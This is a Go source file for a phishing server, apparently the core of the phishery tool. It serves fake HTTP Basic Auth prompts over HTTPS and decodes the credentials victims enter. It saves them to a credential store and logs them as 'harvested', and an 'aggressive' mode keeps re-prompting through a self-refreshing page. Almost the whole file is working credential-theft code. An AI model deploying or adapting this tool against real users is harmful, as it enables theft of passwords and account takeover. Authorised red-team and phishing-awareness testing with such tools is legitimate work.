package phish

import (
	"net/http"
	"strings"
	"encoding/base64"
	"errors"
	"io/ioutil"
	"fmt"
	"time"

	"github.com/ryhanson/phishery/neatprint"
	"github.com/ryhanson/phishery/jstore"
)

type Phishery struct {
	credStore 	*jstore.JsonStore
	settings  	Settings
	aggressive	bool
}

var neat = neatprint.NewNeatPrint()

const aggrHTML = `
<!DOCTYPE html>
<html>
  <head>
    <title>Unauthorized</title>
    <meta http-equiv="refresh" content="0">
  </head>
  <body>
    <p>401 Unauthorized</p>
  </body>
</html>`

func StartPhishery(settingsFile string, credsFile string, aggressive bool) error {
	neat.Event("Loading settings from: %s", settingsFile)
	settings := loadSettings(settingsFile)
	credStore, err := jstore.NewStore(credsFile)
	if err != nil {
		return errors.New("Error initiliazing credential store: " + err.Error())
	}
	neat.Event("Credential store initialized at: %s", credsFile)

	listenOn := settings.IP + ":" + settings.Port
	srv := Phishery{
		credStore: credStore,
		settings: settings,
		aggressive: aggressive,
	}

	neat.Event("Starting HTTPS Auth Server on: %s", listenOn)
	if aggressive {
		neat.Info("Server running in aggressive mode...")
	}
	http.HandleFunc("/", srv.handler)

	return http.ListenAndServeTLS(listenOn, settings.SSLCert, settings.SSLKey, nil)
}

func (srv *Phishery) processAuth(auth string) (AuthInfo, error) {
	authInfo := AuthInfo{}

	b64, err := base64.StdEncoding.DecodeString(auth)
	if err != nil {
		return authInfo, errors.New("Error Decoding Authorization Header")
	}

	creds := strings.SplitN(string(b64), ":", 2)
	if len(creds) != 2 && (creds[0] == "" || creds[1] == "") {
		return authInfo, errors.New("Missing Authorization Credentials")
	}

	authInfo = AuthInfo {
		Username: creds[0],
		Password: creds[1],
	}

	return authInfo, nil
}

func (srv *Phishery) handler(resp http.ResponseWriter, req *http.Request)  {
	// Ignore favicon.ico requests from browsers
	if strings.Contains(req.RequestURI, "favicon.ico") {
		resp.WriteHeader(404)
		return
	}
	printReq(req)

	auth := strings.SplitN(req.Header.Get("Authorization"), " ", 2)
	if (len(auth) == 2) {
		authInfo, err := srv.processAuth(auth[1]);
		if err != nil {
			neat.Error(err.Error())
			return
		}

		authInfo.Host = stripPort(req.Host);
		authInfo.Request = req.Method + " " + req.RequestURI
		authInfo.UserAgent = req.UserAgent();
		authInfo.IPAddress =  stripPort(req.RemoteAddr);

		created, err := srv.credStore.AddObject(authInfo);
		if err != nil {
			neat.Error("Error writing credentials: %s", err)
		}

		if created {
			neat.Info("New credentials harvested!")
			printAuth(authInfo)
		} else {
			neat.Info("Duplicate credentials received for: %s", authInfo.Username)
		}

		srv.writeResponse(resp)
		return
	}
	neat.Info("Sending Basic Auth response to: %s", stripPort(req.RemoteAddr))

	resp.Header().Set("WWW-Authenticate", `Basic realm="` + srv.settings.BasicRealm + `"`)
	resp.Header().Set("Content-Type", "text/html")
	resp.WriteHeader(401)

	if srv.aggressive {
		resp.Write([]byte(aggrHTML))
		return
	}
	resp.Write([]byte("401 Unauthorized"))
}

func (srv *Phishery) writeResponse(resp http.ResponseWriter) {
	if len(srv.settings.ResponseHeaders) > 0 {
		for _, head := range srv.settings.ResponseHeaders {
			resp.Header().Set(head[0], head[1])
		}
	}

	resp.WriteHeader(srv.settings.ResponseStatus)
	if srv.settings.ResponseBody != "" {
		resp.Write([]byte(srv.settings.ResponseBody + "\n"))
		return
	}

	if srv.settings.ResponseFile != "" {
		file, _ := ioutil.ReadFile(srv.settings.ResponseFile)
		resp.Write(file)
		return
	}

	resp.Write([]byte("404 Not Found\n"))
	return
}

func stripPort(ip string) string {
	colon := strings.Index(ip, ":")
	if colon > 0 {
		return ip[:colon]
	}

	return ip
}

func printReq(req *http.Request) {
	stamp := time.Now().Local().Format("2006-01-02 15:04:05")
	reqFmt := "Request Received at %s: %s https://%s%s"
	reqInfo := fmt.Sprintf(reqFmt, stamp, req.Method, stripPort(req.Host), req.RequestURI)
	neat.Info(reqInfo)
}

func printAuth(auth AuthInfo) {
	neat.Data("HTTP", "Host", auth.Host)
	neat.Data("HTTP", "Request", auth.Request)
	neat.Data("HTTP", "User Agent", auth.UserAgent)
	neat.Data("HTTP", "IP Address", auth.IPAddress)
	neat.Data("AUTH", "Username", auth.Username)
	neat.Data("AUTH", "Password", auth.Password)
}